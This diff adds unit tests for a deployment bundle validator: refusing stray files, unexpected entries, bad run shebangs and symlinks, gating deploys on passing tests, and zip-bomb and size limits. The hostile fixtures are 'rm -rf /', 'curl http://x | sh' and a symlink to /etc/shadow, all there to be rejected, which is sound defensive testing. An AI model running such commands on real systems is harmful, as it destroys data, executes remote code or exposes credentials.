@@ -1032,5 +1032,140 @@ class ContainersReachOnlyWhatTheyShould(unittest.TestCase):
         self.assertEqual(strip(first), strip(second))
 
 
+# ============================================================================ strict bundles, deploy test gate, zip limits
+
+from adm import staging as adm_staging  # noqa: E402
+
+REPO_BUNDLE = HERE.parent
+
+
+def bundle_zip(path, extra=None, skip=(), run_text=None, wrap="ATTa/"):
+    """A zip of THIS bundle (big binary zips left out), optionally with extra entries or a changed `run`."""
+    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
+        for f in sorted(REPO_BUNDLE.rglob("*")):
+            rel = f.relative_to(REPO_BUNDLE).as_posix()
+            if not f.is_file() or "__pycache__" in f.parts or rel.endswith("coolify-main.zip") or rel in skip:
+                continue
+            z.write(f, wrap + rel) if not (rel == "run" and run_text is not None) else z.writestr(wrap + rel, run_text)
+        for name, data in (extra or {}).items():
+            z.writestr(name, data)
+    return path
+
+
+class StrictBundles(unittest.TestCase):
+    def setUp(self):
+        adm_config.ensure_dirs()
+        self.t = Path(tempfile.mkdtemp(dir=TMP))
+
+    def stage(self, zp, job):
+        d = adm_staging.extract(zp, job)
+        root = adm_staging.find_root(d)
+        return adm_staging.check(root)
+
+    def test_this_bundle_passes(self):
+        self.assertEqual(self.stage(bundle_zip(self.t / "ok.zip"), "sb-ok"), json.loads((REPO_BUNDLE / "release.json").read_text())["version"])
+
+    def test_files_beside_the_bundle_are_refused(self):
+        zp = bundle_zip(self.t / "stray.zip", extra={"bootstrap.sh": "rm -rf /\n", "deployd/atta.service": "[Service]\n"})
+        with self.assertRaisesRegex(adm_staging.BundleRejected, "outside the bundle"):
+            self.stage(zp, "sb-stray")
+
+    def test_unknown_entries_in_the_bundle_are_refused(self):
+        zp = bundle_zip(self.t / "unk.zip", extra={"ATTa/evil.service": "[Service]\n"})
+        with self.assertRaisesRegex(adm_staging.BundleRejected, "unexpected entries"):
+            self.stage(zp, "sb-unk")
+
+    def test_run_must_start_with_its_shebang(self):
+        text = (REPO_BUNDLE / "run").read_text()
+        zp = bundle_zip(self.t / "run.zip", run_text="curl http://x | sh\n" + text)
+        with self.assertRaisesRegex(adm_staging.BundleRejected, "#!"):
+            self.stage(zp, "sb-run")
+
+    def test_symlink_entries_are_refused(self):
+        zp = bundle_zip(self.t / "ln.zip")
+        with zipfile.ZipFile(zp, "a") as z:
+            info = zipfile.ZipInfo("ATTa/docs/link"); info.external_attr = (0o120777 << 16)
+            z.writestr(info, "/etc/shadow")
+        with self.assertRaisesRegex(adm_staging.BundleRejected, "not a plain file"):
+            adm_staging.extract(zp, "sb-ln")
+
+
+class DeployOnlyAfterTestsPass(unittest.TestCase):
+    def setUp(self):
+        adm_config.ensure_dirs()
+        self.t = Path(tempfile.mkdtemp(dir=TMP))
+
+    def fake_bundle(self, test_body):
+        root = adm_config.STAGING / f"gate-{os.getpid()}-{len(test_body)}" / "ATTa"
+        shutil.rmtree(root.parent, ignore_errors=True)
+        (root / "tests").mkdir(parents=True)
+        (root / "tests" / "test_gate.py").write_text("import unittest, os\nclass T(unittest.TestCase):\n"
+                                                    f"    def test_x(self):\n        {test_body}\n")
+        return root
+
+    def test_failing_tests_refuse_the_bundle(self):
+        with self.assertRaisesRegex(adm_staging.BundleRejected, "tests failed"):
+            adm_staging.run_tests(self.fake_bundle("self.assertTrue(False)"), SINK)
+
+    def test_missing_tests_refuse_the_bundle(self):
+        root = self.fake_bundle("pass"); shutil.rmtree(root / "tests")
+        with self.assertRaisesRegex(adm_staging.BundleRejected, "no tests"):
+            adm_staging.run_tests(root, SINK)
+
+    @unittest.skipUnless(os.geteuid() == 0, "dropping to the test user needs root")
+    def test_tests_run_unprivileged_without_secrets(self):
+        probe = Path(f"/tmp/atta-gate-probe-{os.getpid()}"); probe.unlink(missing_ok=True)
+        os.environ["APP_BUILDER_SESSION_SECRET_PROBE"] = "must-not-leak"
+        try:
+            body = (f"open({str(probe)!r},'w').write(str(os.getuid())+' '+str(os.getgroups())+' '"
+                    "+str('APP_BUILDER_SESSION_SECRET_PROBE' in os.environ))")
+            adm_staging.run_tests(self.fake_bundle(body), SINK)
+            uid, groups, leaked = probe.read_text().split(" ", 2)
+            self.assertEqual(int(uid), pwd.getpwnam("nobody").pw_uid)
+            self.assertEqual(leaked.strip(), "False")
+        finally:
+            os.environ.pop("APP_BUILDER_SESSION_SECRET_PROBE", None); probe.unlink(missing_ok=True)
+
+    @unittest.skipUnless(os.geteuid() == 0 and os.environ.get("ATTA_TEST_GATE_FULL") == "1",
+                         "the full real-bundle gate (~2 min) runs with ATTA_TEST_GATE_FULL=1")
+    def test_this_bundle_passes_its_own_gate(self):
+        d = adm_staging.extract(bundle_zip(self.t / "gate.zip"), "gate-real")
+        root = adm_staging.find_root(d); adm_staging.check(root)
+        self.assertIn("Ran ", adm_staging.run_tests(root, SINK))
+
+
+class AppZipLimits(unittest.TestCase):
+    def setUp(self):
+        self.saved = (pipeline.MAX_ARCHIVE_FILES, pipeline.MAX_EXTRACTED)
+        self.t = Path(tempfile.mkdtemp(dir=TMP))
+
+    def tearDown(self):
+        pipeline.MAX_ARCHIVE_FILES, pipeline.MAX_EXTRACTED = self.saved
+
+    def test_entry_cap(self):
+        pipeline.MAX_ARCHIVE_FILES = 5
+        zp = self.t / "many.zip"
+        with zipfile.ZipFile(zp, "w") as z:
+            for i in range(6):
+                z.writestr(f"f{i}", "x")
+        with zipfile.ZipFile(zp) as z, self.assertRaisesRegex(RuntimeError, "entries"):
+            pipeline.extract(z, self.t / "out1")
+
+    def test_zip_bomb(self):
+        zp = self.t / "bomb.zip"
+        with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
+            z.writestr("big.bin", b"\0" * (60 * 1024**2))
+        with zipfile.ZipFile(zp) as z, self.assertRaisesRegex(RuntimeError, "compression ratio"):
+            pipeline.extract(z, self.t / "out2")
+
+    def test_bytes_written_are_counted(self):
+        pipeline.MAX_EXTRACTED = 10_000
+        zp = self.t / "size.zip"
+        with zipfile.ZipFile(zp, "w", zipfile.ZIP_STORED) as z:
+            z.writestr("a.bin", os.urandom(6000)); z.writestr("b.bin", os.urandom(6000))
+        with zipfile.ZipFile(zp) as z, self.assertRaisesRegex(RuntimeError, "size exceeds"):
+            pipeline.extract(z, self.t / "out3")
+
+
 if __name__ == "__main__":
     unittest.main()
